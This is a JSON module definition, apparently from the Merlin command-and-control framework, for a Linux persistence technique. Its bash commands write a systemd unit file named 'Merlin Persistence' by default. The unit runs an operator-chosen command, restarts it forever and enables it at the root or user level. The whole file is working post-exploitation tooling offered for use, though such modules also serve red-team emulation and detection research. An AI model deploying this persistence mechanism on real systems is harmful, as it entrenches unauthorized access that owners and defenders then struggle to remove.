{
    "base": {
      "name": "systemdService",
      "type": "standard",
      "author": ["Tony M Lambert (@ForensicITGuy)"],
      "credits": [],
      "path": ["linux", "x64", "bash", "persistence", "systemdService.json"],
      "platform": "linux",
      "arch": "x64",
      "lang": "bash",
      "privilege": false,
      "notes": "",
      "remote": "",
      "local": [],
      "options": [
        {"name": "ServiceName", "value": "Merlin", "required": true, "flag": "", "description": "The name of the systemd unit file."},
        {"name": "ServiceDescription", "value": "Merlin Persistence", "required": true, "flag": "", "description": "The description line of the systemd unit file."},
        {"name": "ServiceAction", "value": "/bin/sh -c", "required": true, "flag": "", "description":"The action executed by the service."}
      ],
      "description": "Establishes persistence of a specified command using a systemd service unit file.",
      "commands": [
        "if [ \"$EUID\" -eq 0 ];",
        "then UNIT_FILE_PATH=/lib/systemd/service;",
        "else UNIT_FILE_PATH=`echo ~`/.config/systemd/user;",
        "fi;",
        "UNIT_FILE_FULL=$UNIT_FILE_PATH/{{ServiceName.value}}.service;",
        "echo \"[Unit]\" > $UNIT_FILE_FULL;",
        "echo \"Description={{ServiceDescription.value}}\" >> $UNIT_FILE_FULL;",
        "echo \"\" >> $UNIT_FILE_FULL;",
        "echo \"[Service]\" >> $UNIT_FILE_FULL;",
        "echo \"Type=simple\" >> $UNIT_FILE_FULL;",
        "echo \"ExecStart={{ServiceAction.value}}\" >> $UNIT_FILE_FULL;",
        "echo \"RemainAfterExit=yes\" >> $UNIT_FILE_FULL;",
        "echo \"RestartSec=10s\" >> $UNIT_FILE_FULL;",
        "echo \"Restart=always\" >> $UNIT_FILE_FULL;",
        "echo \"TimeoutStartSec=5\" >> $UNIT_FILE_FULL;",
        "echo \"\" >> $UNIT_FILE_FULL;",
        "echo \"[Install]\" >> $UNIT_FILE_FULL;",
        "echo \"WantedBy=default.target\" >> $UNIT_FILE_FULL;",
        "if [ \"$EUID\" -eq 0 ];",
        "then systemctl daemon-reload;",
        "systemctl enable $UNIT_FILE_FULL;",
        "else systemctl --user daemon-reload;",
        "systemctl --user enable $UNIT_FILE_FULL;",
        "fi;"
      ]
    }
  }